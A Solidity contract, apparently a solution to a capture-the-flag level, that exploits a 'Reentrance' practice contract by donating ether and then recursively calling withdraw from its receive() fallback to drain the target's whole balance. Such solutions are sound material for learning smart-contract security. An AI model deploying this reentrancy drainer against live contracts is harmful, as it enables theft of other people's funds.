// SPDX-License-Identifier: Unlicense
pragma solidity =0.8.23;

import {Reentrance} from "../10_Reentrance/Reentrance.sol";

contract HackReentrance {
    uint256 constant AMOUNT = 1 ether;
    Reentrance immutable target;

    constructor(address payable _target) {
        target = Reentrance(_target);
    }

    function attack() external payable {
        if (msg.value != 1 ether) revert();

        target.donate{value: AMOUNT}(address(this));

        callWithdraw();
    }

    receive() external payable {
        callWithdraw();
    }

    function callWithdraw() private {
        uint256 targetBalance = address(target).balance;
        bool keepRecursing = targetBalance > 0;

        if (keepRecursing) {
            uint256 callAmount = targetBalance > AMOUNT ? AMOUNT : targetBalance;
            target.withdraw(callAmount);
        }
    }
}
